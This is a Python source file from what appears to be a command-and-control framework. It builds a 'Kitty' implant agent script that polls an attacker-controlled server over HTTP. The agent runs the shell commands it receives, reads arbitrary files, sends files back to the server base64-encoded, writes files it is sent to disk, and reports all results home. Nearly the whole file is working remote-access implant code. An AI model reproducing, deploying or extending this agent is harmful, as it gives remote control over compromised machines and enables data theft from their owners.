#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Typed Kitty agent script builder (extends HTTP polling)."""

from __future__ import annotations

from typing import Optional

from lib.c2.beacon_profile import BeaconProfile
from lib.c2.http_polling_agent import build_http_polling_agent_script


def build_kitty_agent_script(
    host: str,
    port: int,
    client_id: str,
    *,
    url_prefix: str = "/c2",
    use_ssl: bool = False,
    private_key_pem: Optional[str] = None,
    profile: Optional[BeaconProfile] = None,
    chain_token: str = "",
    chain_listen_port: int = 0,
    chain_listen_host: str = "0.0.0.0",
) -> str:
    """Build a typed-task agent (shell/ls/pwd/whoami/cat/download/upload).

    Wire format: poll JSON may include ``encoding=task`` and ``task`` object.
    Falls back to legacy shell-string ``command`` for compatibility.
    """
    # Start from classic polling agent then swap the command execution loop
    base = build_http_polling_agent_script(
        host,
        port,
        client_id,
        url_prefix=url_prefix,
        use_ssl=use_ssl,
        private_key_pem=private_key_pem,
        profile=profile,
        chain_token=chain_token,
        chain_listen_port=chain_listen_port,
        chain_listen_host=chain_listen_host,
        cover_traffic=bool(profile.cover_traffic) if profile else True,
    )

    # Replace the command execution block with a typed dispatcher
    old_exec = (
        "  cmd=''\n"
        "  if data.get('command'):\n"
        "   cmd=base64.b64decode(data['command']).decode('utf-8','replace') if data.get('encoding')=='base64' else str(data['command'])\n"
        "  out=''\n"
        "  if cmd.strip():\n"
        "   try:\n"
        "    p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)\n"
        "    out=(p.stdout or '')+(p.stderr or '')\n"
        "    if not out.strip(): out='[exit %s]'%p.returncode\n"
        "   except Exception as e: out='ERROR:%s'%e\n"
        "   body=json.dumps({'output':base64.b64encode(out.encode()).decode(),'encoding':'base64','id':CID}).encode()\n"
        "   _req('POST',PREFIX+'/result?'+q,body=body,headers={'Content-Type':'application/json'})\n"
    )

    new_exec = (
        "  def _run_task(task):\n"
        "   tid=str(task.get('task_id') or ''); cmd=str(task.get('command') or '').lower(); args=task.get('args') or {}\n"
        "   out=''; files=[]; status='completed'\n"
        "   try:\n"
        "    if cmd in ('shell','cmd'):\n"
        "     c=str(args.get('cmd') or args.get('command') or '')\n"
        "     p=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=120)\n"
        "     out=(p.stdout or '')+(p.stderr or '') or ('[exit %s]'%p.returncode)\n"
        "    elif cmd=='pwd':\n"
        "     out=os.getcwd()\n"
        "    elif cmd=='whoami':\n"
        "     out=os.environ.get('USERNAME') or os.environ.get('USER') or subprocess.getoutput('whoami')\n"
        "    elif cmd=='ls':\n"
        "     path=str(args.get('path') or '.'); entries=os.listdir(path)\n"
        "     out='\\n'.join(entries)\n"
        "    elif cmd=='cat':\n"
        "     path=str(args.get('path') or ''); out=open(path,'r',errors='replace').read(200000)\n"
        "    elif cmd=='download':\n"
        "     path=str(args.get('path') or ''); raw=open(path,'rb').read()\n"
        "     files.append({'path':path,'encoding':'base64','data':base64.b64encode(raw).decode()}); out='OK %s bytes'%len(raw)\n"
        "    elif cmd=='upload':\n"
        "     path=str(args.get('path') or ''); blob=str(args.get('data') or '')\n"
        "     open(path,'wb').write(base64.b64decode(blob)); out='OK wrote %s'%path\n"
        "    elif cmd=='exit':\n"
        "     out='bye'; return out,files,status,True\n"
        "    else:\n"
        "     # legacy: treat command field as shell\n"
        "     c=str(task.get('command') or '')\n"
        "     p=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=120)\n"
        "     out=(p.stdout or '')+(p.stderr or '') or ('[exit %s]'%p.returncode)\n"
        "   except Exception as e:\n"
        "    out='ERROR:%s'%e; status='failed'\n"
        "   return out,files,status,False\n"
        "  die_local=False\n"
        "  task=data.get('task') if isinstance(data.get('task'),dict) else None\n"
        "  if not task and data.get('command'):\n"
        "   raw=data.get('command')\n"
        "   if data.get('encoding')=='base64':\n"
        "    try: raw=base64.b64decode(raw).decode('utf-8','replace')\n"
        "    except Exception: raw=str(raw)\n"
        "   if data.get('encoding')=='task':\n"
        "    try: task=json.loads(raw)\n"
        "    except Exception: task={'command':'shell','args':{'cmd':str(raw)},'task_id':''}\n"
        "   else:\n"
        "    task={'command':'shell','args':{'cmd':str(raw)},'task_id':''}\n"
        "  if task:\n"
        "   out,files,status,die_local=_run_task(task)\n"
        "   body=json.dumps({'output':base64.b64encode(out.encode()).decode(),'encoding':'base64','id':CID,'task_id':task.get('task_id') or '','status':status,'files':files}).encode()\n"
        "   _req('POST',PREFIX+'/result?'+q,body=body,headers={'Content-Type':'application/json'})\n"
        "   if die_local: break\n"
    )

    if old_exec not in base:
        # Fallback: append typed runner note — shouldn't happen
        return base + "\n# typed agent patch missing\n"
    return base.replace(old_exec, new_exec, 1)
